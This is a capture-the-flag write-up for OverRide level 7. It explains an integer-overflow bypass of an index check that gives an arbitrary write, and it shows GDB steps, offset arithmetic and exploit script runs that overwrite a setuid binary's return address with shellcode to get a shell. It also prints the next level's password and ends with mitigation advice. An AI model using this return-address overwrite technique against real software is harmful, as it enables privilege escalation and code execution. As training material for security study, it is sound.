# Level 7 - Arbitrary Memory Write via Integer Overflow

## Overview

This level demonstrates **arbitrary memory write** through an integer array interface. The program provides `store`, `read`, and `quit` commands to manipulate a database array. While there are checks to prevent writing to certain indices (multiples of 3), these can be bypassed using **integer overflow**. The goal is to overwrite the return address with shellcode stored in the array.

## Vulnerability: Integer Overflow to Buffer Overflow [CWE-190](https://cwe.mitre.org/data/definitions/190.html)

### Description

This vulnerability combines several concepts:

**Integer Overflow**:
- Index is an `unsigned int` (0 to 4,294,967,295)
- After checking `index % 3`, the index is used without bounds checking
- `shl eax, 2` multiplies index by 4 to get byte offset
- Overflow allows bypassing the modulo 3 restriction

**Arbitrary Memory Write**:
- `database[index] = number` writes 4 bytes anywhere
- No bounds checking on the database array
- Can overwrite return address, function pointers, etc.

**Protection Bypass**:
- Environment and argv are cleared (no shellcode in env)
- Stack canary enabled (but we don't corrupt it)
- NX disabled (stack executable - allows shellcode)

### Key Characteristics

- **Two checks**: `index % 3 != 0` and `(number >> 24) != 0xb7`
- **Integer overflow**: Use values > UINT_MAX/4 to bypass modulo check
- **Shellcode in array**: Store shellcode directly in the database
- **RET overwrite**: Calculate offset to return address

## Analysis

### Initial Reconnaissance

```bash
level07@OverRide:~$ ls -la
-rwsr-s---+ 1 level08 users 12228 Sep 10  2016 level07
```

Binary runs with `level08` privileges.

### Reverse Engineering

Using GDB to analyze:

```bash
level07@OverRide:~$ gdb ./level07
(gdb) disas main
(gdb) disas store_number
```

#### Store Number Function

Key assembly instructions:

```asm
; Modulo 3 check (optimized division)
0x08048671 <+65>:   mov    edx,0xaaaaaaab      ; Magic number for /3
0x08048676 <+70>:   mul    edx
0x0804867a <+74>:   shr    edx,1
0x0804867e <+78>:   add    eax,eax             ; eax = (index/3) * 3
0x08048680 <+80>:   add    eax,edx
0x08048684 <+84>:   sub    edx,eax             ; remainder
0x08048686 <+86>:   test   edx,edx
0x08048688 <+88>:   je     0x8048697           ; Jump if divisible by 3

; High byte check
0x0804868d <+93>:   shr    eax,0x18            ; Shift right 24 bits
0x08048690 <+96>:   cmp    eax,0xb7
0x08048695 <+101>:  jne    0x80486c2

; Write to array
0x080486c2 <+146>:  mov    eax,DWORD PTR [ebp-0xc]  ; index
0x080486c5 <+149>:  shl    eax,0x2                   ; index * 4
0x080486c8 <+152>:  add    eax,DWORD PTR [ebp+0x8]  ; database + offset
0x080486cb <+155>:  mov    edx,DWORD PTR [ebp-0x10] ; number
0x080486ce <+158>:  mov    DWORD PTR [eax],edx      ; *ptr = number
```

**Checks**:
1. `index % 3 == 0` → rejected (reserved for wil)
2. `(number >> 24) == 0xb7` → rejected (prevents stack addresses)

### Calculating RET Offset

Stack layout from main:

```
ESP alignment: 16 bytes (and esp, 0xfffffff0 removes 12 bytes)
Stack size: 0x1d0 = 464 bytes
Database start: ESP + 0x24 = ESP + 36 bytes
Saved registers: 4 (ebp, edi, esi, ebx) = 16 bytes
```

**RET address offset**:
```
Distance from database to RET = (464 - 36) + 16 + 12 = 456 bytes
Index = 456 / 4 = 114
```

But `114 % 3 == 0`! We need overflow.

### Integer Overflow Technique

The `shl eax, 2` operation multiplies index by 4:
```
index * 4 = byte_offset
```

For overflow:
```
UINT_MAX = 4,294,967,295
(UINT_MAX + 1) / 4 = 1,073,741,824
```

To reach index 114:
```
overflow_value = 1,073,741,824 + 114 = 1,073,741,938
```

Verification:
```
1,073,741,938 % 3 = 2 ✓ (not divisible by 3)
1,073,741,938 * 4 = 4,294,967,752
4,294,967,752 % (2^32) = 456 (wraps around to index 114)
```

## Exploitation

### Method 1: Manual with GDB Address

**Step 1**: Find database address

```bash
(gdb) break *0x08048795    # Where database address is loaded
(gdb) run
Breakpoint 1, 0x08048795 in main ()
(gdb) print/x $ebx
$1 = 0xffffd504
```

**Note**: GDB adds environment variables, so add ~32 bytes for safety:
```
0xffffd504 + 32 = 0xffffd524
```

**Step 2**: Calculate shellcode address (add NOP sled offset)

```
shellcode_addr = 0xffffd504 + 16 = 0xffffd514 (decimal: 4294956308)
```

**Step 3**: Prepare shellcode (split into 4-byte chunks, little-endian)

```
Shellcode: https://shell-storm.org/shellcode/files/shellcode-752.html
```

**Step 4**: Run exploit using Python script

The `exploit_complete.py` script automates the entire process:

```bash
level07@OverRide:~$ # Find database address in GDB
level07@OverRide:~$ gdb ./level07
(gdb) break *0x08048795
(gdb) run
(gdb) print/x $ebx
$1 = 0xffffc664
(gdb) quit

level07@OverRide:~$ # Run exploit with address + offset
level07@OverRide:~$ python3 exploit_complete.py 0xffffc6c8
[*] Storing 10 shellcode chunks...
[*] Database at: 0xffffc6c8
[*] Shellcode at: 0xffffc6d8
[*] Writing to RET (index 114, overflow: 1073741938)

level07@OverRide:~$ # Pipe to level07 (keep stdin open with cat)
level07@OverRide:~$ (python3 exploit_complete.py 0xffffc6c8 ; cat) | ./level07
[... output ...]
$ cat /home/users/level08/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
```

**Note**: The exact address offset varies. If the exploit doesn't work:
- Try addresses: GDB_ADDR + 80, +100, +120, +150
- Adjust until you get a shell

### Method 2: Using Python Script

```bash
python3 exploit.py --file
cat /tmp/level07_exploit - | ./level07
```

## Solution

### For Developers - How to Prevent This

1. **Always validate array indices**:
   ```c
   // BAD - No bounds checking
   database[index] = number;

   // GOOD - Validate bounds
   if (index >= ARRAY_SIZE) {
       return ERROR;
   }
   database[index] = number;
   ```

2. **Check for integer overflow**:
   ```c
   // Check before multiplication
   if (index > UINT_MAX / 4) {
       return ERROR;
   }
   offset = index * 4;
   ```

3. **Use safe integer libraries**:
   - C: `<stdint.h>` with explicit size types
   - Use `SIZE_MAX` for array bounds
   - Check `__builtin_mul_overflow()` (GCC/Clang)

4. **Enable all protections**:
   ```bash
   gcc -fstack-protector-all -D_FORTIFY_SOURCE=2 -Wl,-z,relro,-z,now source.c
   ```

5. **Use bounds-checking tools**:
   - AddressSanitizer: `-fsanitize=address`
   - UndefinedBehaviorSanitizer: `-fsanitize=undefined`
   - Valgrind for runtime checking

6. **Never trust user input**:
   - Validate all inputs
   - Use whitelist validation
   - Implement principle of least privilege

## Key Takeaways

- Integer overflow can bypass modulo checks and array bounds
- Unsigned integer wraparound is defined behavior in C
- Shift operations (`shl`) can be exploited with overflows
- Arbitrary write primitives allow complete code execution
- Clearing environment doesn't prevent all shellcode injection
- Stack canaries don't protect against precise overwrites
- Defense in depth: combine bounds checking, overflow detection, and memory protections
- Modern protections (ASLR, NX, RELRO) make exploitation harder but not impossible

## Password

```
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
```
